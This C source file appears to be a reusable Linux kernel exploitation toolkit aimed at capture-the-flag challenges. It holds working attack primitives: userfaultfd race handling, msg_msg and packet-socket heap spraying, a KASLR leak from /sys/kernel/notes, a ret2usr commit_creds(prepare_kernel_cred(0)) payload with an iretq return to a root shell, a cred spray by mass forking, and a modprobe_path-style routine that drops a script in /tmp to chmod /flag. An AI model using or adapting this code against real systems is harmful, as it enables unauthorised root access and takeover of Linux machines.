#define _GNU_SOURCE
#include <fcntl.h>
// #include <keyutils.h>
#include <pthread.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <threads.h>
#include <unistd.h>

#include "./klog.h"
#include "./kpwn.h"

/* NOTE: useful information
 * cat /proc/kallsyms | grep "prepare_kernel_cred"
 * sudo cat /proc/buddyinfo
 * sudo cat /proc/pagetypeinfo
 * sudo cat /proc/slabinfo
 * sudo cat /sys/kernel/slab/xxx
 */

#define KERNCALL __attribute__((regparm(3)))
#define PAGE_SIZE_D 0x1000

void *(*prepare_kernel_cred)(void *)KERNCALL;
void (*commit_creds)(void *) KERNCALL;

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t kernel_base, canary;
uint64_t page_size;

void dump_hex(const char *restrict hex, uint64_t len) {
  uint64_t i = 0, cnt = 0;
  uint64_t res = len % 0x10;
  uint64_t append = res != 0;

  uint64_t times = len / 0x10 + append;
  uint64_t __len = (len & (~0xf)) + (append << 4);

  char *str = (char *)malloc(__len);
  char *__hex = (char *)malloc(__len);
  memset(str, 0, __len);
  memcpy(str, hex, len);
  memcpy(__hex, str, __len);
  for (size_t l = 0; l < __len; ++l) {
    if (l >= len || hex[l] < ' ' || hex[l] >= 0x7f) {
      str[l] = '.';
    }
  }
  char str1[0x9] = {0}, str2[0x9] = {0};

  for (i = 0, cnt = 0; i < times; ++i) {
    memcpy(str1, str + cnt * 0x8, 0x8);
    memcpy(str2, str + (cnt + 1) * 0x8, 0x8);
    info("0x%04lx:  0x%016lx  0x%016lx    %s %s\n", i * 0x10,
         ((uint64_t *)__hex)[cnt], ((uint64_t *)__hex)[cnt + 1], str1, str2);
    cnt += 2;
  }

  free(__hex);
  free(str);
  return;
}

#ifndef MUSL
void __attribute_deprecated_msg__("we have new and powerful dump_hex")
    hexdump(uint64_t *payload, size_t len) {
  for (int i = 0; i < len; ++i) {
    printf("%d:\t%#lx\n", i, payload[i]);
  }
}
#endif

uint64_t calc(uint64_t addr) { return addr - 0xffffffff81000000 + kernel_base; }

/*
 * PART userfaultfd
 */

#include "./uffd.h"
#include <poll.h>

static pthread_t monitor_thread;
uint64_t page_userfaultfd[0x1000];

// userfaultfd (deprecated)
void register_userfaultfd(void *addr, uint64_t len, void *(*handler)(void *)) {
  long uffd;
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  /* Create and enable userfaultfd object */
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1)
    err_exit("userfaultfd");

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    err_exit("ioctl-UFFDIO_API");

  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    err_exit("ioctl-UFFDIO_REGISTER");

  s = pthread_create(&monitor_thread, NULL, handler, (void *)uffd);
  if (s != 0)
    err_exit("pthread_create");
}

static void *fault_handler_thread(void *arg) {
  static struct uffd_msg msg;
  static int fault_cnt = 0;
  long uffd;

  struct uffdio_copy uffdio_copy;
  ssize_t nread;

  uffd = (long)arg;

  for (;;) {
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);

    /*
     * 当 poll 返回时说明出现了缺页异常
     * 你可以在这里插入一些比如说 sleep() 一类的操作
     */
    success("enter the fault handler\n");

    // fd_tty = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (nready == -1)
      err_exit("poll");

    nread = read(uffd, &msg, sizeof(msg));

    if (nread == 0)
      err_exit("EOF on userfaultfd!\n");

    if (nread == -1)
      err_exit("read");

    if (msg.event != UFFD_EVENT_PAGEFAULT)
      err_exit("Unexpected event on userfaultfd\n");

    uffdio_copy.src = (uint64_t)page_userfaultfd;
    uffdio_copy.dst = (uint64_t)msg.arg.pagefault.address & ~(page_size - 1);
    uffdio_copy.len = page_size;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
      err_exit("ioctl-UFFDIO_COPY");
  }
}

/*
 * PART USMA
 */

#include "./ifpk.h"
#include <arpa/inet.h>
#include <net/if.h> // 添加 if_nametoindex 函数的头文件

#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif
void packet_socket_rx_ring_init(int s, uint32_t block_size, uint32_t frame_size,
                                uint32_t block_nr, uint32_t sizeof_priv,
                                uint32_t timeout) {
  int v = TPACKET_V3;
  check(setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v)));

  struct tpacket_req3 req;
  memset(&req, 0, sizeof(req));
  req.tp_block_size = block_size;
  req.tp_frame_size = frame_size;
  req.tp_block_nr = block_nr;
  req.tp_frame_nr = (block_size * block_nr) / frame_size;
  req.tp_retire_blk_tov = timeout;
  req.tp_sizeof_priv = sizeof_priv;
  req.tp_feature_req_word = 0;

  check(setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req)));
}

int packet_socket_setup(uint32_t block_size, uint32_t frame_size,
                        uint32_t block_nr, uint32_t sizeof_priv,
                        int32_t timeout) {

  int s = check(socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)));

  packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv,
                             timeout);

  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_family = PF_PACKET;
  sa.sll_protocol = htons(ETH_P_ALL);
  sa.sll_ifindex = if_nametoindex("lo");
  sa.sll_hatype = 0;
  sa.sll_pkttype = 0;
  sa.sll_halen = 0;

  check(bind(s, (struct sockaddr *)&sa, sizeof(sa)));

  return s;
}

int pagealloc_pad(int count, int size) {
  return packet_socket_setup(size, 2048, count, 0, 100);
}

#ifndef MSG_COPY
#define MSG_COPY 0x4000
#endif
/*
 * struct msg_msg
 */

int get_msg_queue(void) { return msgget(IPC_PRIVATE, 0666 | IPC_CREAT); }

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  ((struct msgbuf *)msgp)->mtype = msgtyp;
  return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp,
                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_type, uint64_t m_ts, uint64_t next,
               uint64_t security) {
  msg->m_list.next = m_list_next;
  msg->m_list.prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = security;
}

void __attribute__((naked)) save_stat() {
  asm volatile("movq %%cs, %0;"
               "movq %%ss, %1;"
               "movq %%rsp, %2;"
               "pushfq;"
               "popq %3;"
               "ret;"
               : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
               :
               : "memory");
}

void templine() {
  commit_creds(prepare_kernel_cred(0));
  asm("pushq   %0;"
      "pushq   %1;"
      "pushq   %2;"
      "pushq   %3;"
      "pushq   $shell;"
      "pushq   $0;"
      "swapgs;"
      "popq    %%rbp;"
      "iretq;" ::"m"(user_ss),
      "m"(user_sp), "m"(user_rflags), "m"(user_cs));
}

#include <sched.h>

void bind_cpu(int core) {
  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void unshare_setup() {
  char edit[0x100];
  int tmp_fd;

  if (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))
    err_exit("FAILED to create a new namespace");

  tmp_fd = open("/proc/self/setgroups", O_WRONLY);
  write(tmp_fd, "deny", strlen("deny"));
  close(tmp_fd);

  tmp_fd = open("/proc/self/uid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", getuid());
  write(tmp_fd, edit, strlen(edit));
  close(tmp_fd);

  tmp_fd = open("/proc/self/gid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", getgid());
  write(tmp_fd, edit, strlen(edit));
  close(tmp_fd);
}

/*
 * read /sys/kernel/notes for passing kaslr
 * maybe deprecated
 */
uint64_t leak_from_notes() {
  int fd_leak = open("/sys/kernel/notes", 0);
  char leak[0x100] = {0};
  read(fd_leak, leak, 0x100);
  uint64_t base = *(uint64_t *)(&leak[0x9c]) - 0x2000;
  success("leaking address: %#lx", base);
  return base;
}

void inline __attribute__((always_inline)) pt_reg(int fd, char *buffer) {
  __asm__ __volatile__("movq $0xbeefdead,   %%r15;"
                       "movq $0x11111111,   %%r14;" // 0x78
                       "movq $0x22222222,   %%r13;"
                       "movq $0x33333333,   %%r12;"
                       "movq $0x66666666,   %%r11;"
                       "movq $0x77777777,   %%r10;"
                       "movq $0x88888888,    %%r9;"
                       "movq $0x99999999,    %%r8;"
                       "movq $0xaaaaaaaa,   %%rcx;"
                       "xorq %%rdi,   %%rdi;"
                       "movl %0,   %%edi;"
                       "movq %1,   %%rsi;"
                       "movq $0x20,   %%rdx;"
                       "movq $1,   %%rax;"
                       "syscall;" ::"r"(fd),
                       "r"(buffer));
}

void get_flag() {
  system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
  system("chmod +x /tmp/x");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
  system("chmod +x /tmp/dummy");
  system("/tmp/dummy");
  usleep(3000);
  system("cat /flag");
  pause();
  exit(0);
}

void get_flag_nf() {
  execve("/tmp/dummy", NULL, NULL);
  int fd_flag = open("/flag", 2);
  char buf[0x100] = {0};
  read(fd_flag, buf, 0x100);
  dump_hex(buf, 0x100);
  success("flag: %s\n", buf);
  pause();
  exit(0);
}

void __attribute__((noreturn)) shell() {
  if (!getuid()) {
    success("[=============================================]\n");
    success("[===================" SUCCESS "===================]\n");
    success("[=============================================]\n");
    system("/bin/sh");
  } else {
    err_exit("*** root failed ***");
  }

  for (;;) {
    sleep(0x100);
  }
}

void shell_noerr() {
  if (!getuid()) {
    success("root in pid: %d\n", getpid());
    success("[=============================================]\n");
    success("[===================" SUCCESS "===================]\n");
    success("[=============================================]\n");
    system("/bin/sh");
  }
}

void fork_to_root() {
  for (int i = 0; i < 0x20; ++i) {
    setuid(1000);
  }

  info("spray cred_jar\n");

  for (int i = 0; i < 0x200; ++i) {
    if (!check(fork())) {
      while (1) {
        shell_noerr();
        sleep(0x1);
      }
      exit(0);
    }
  }
  info("fork to root\n");
}

/*
 * rlimit
 */
#include <sys/resource.h>

void adjust_rlimit() {
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  warn_on(setrlimit(RLIMIT_AS, &rlim),
          "can't set virtual space more than %#llx\n", 200ll << 20);

  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  warn_on(setrlimit(RLIMIT_MEMLOCK, &rlim),
          "can't set memory lock more than %#llx\n", 32ll << 20);

  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  warn_on(setrlimit(RLIMIT_FSIZE, &rlim),
          "can't set file size more than %#llx\n", 136ll << 20);

  rlim.rlim_cur = rlim.rlim_max = 1 << 20;

  warn_on(setrlimit(RLIMIT_STACK, &rlim),
          "can't set stack size more than %#llx\n", 1ll << 20);

  rlim.rlim_cur = rlim.rlim_max = 0;
  warn_on(setrlimit(RLIMIT_CORE, &rlim), "can't set coredump size to 0\n");

  getrlimit(RLIMIT_NPROC, &rlim);
  warn("nporc's soft limit: %lu(%#lx), hard limit: %lu(%#lx)\n", rlim.rlim_cur,
       rlim.rlim_cur, rlim.rlim_max, rlim.rlim_max);

  // RLIMIT_FILE
  rlim.rlim_cur = rlim.rlim_max = 14096;
  if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
    warn("can't set open files more than %lu, trying 4096\n", rlim.rlim_max);
    rlim.rlim_cur = rlim.rlim_max = 4096;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      err_exit("setrlimit");
    }
  }
}

/*
 * pipe
 */

// argument `size` stands for bytes
int resize_pipe(int pipe_fd, uint64_t size) {
  return fcntl(pipe_fd, F_SETPIPE_SZ, 0x1000 * (size / 0x8));
}
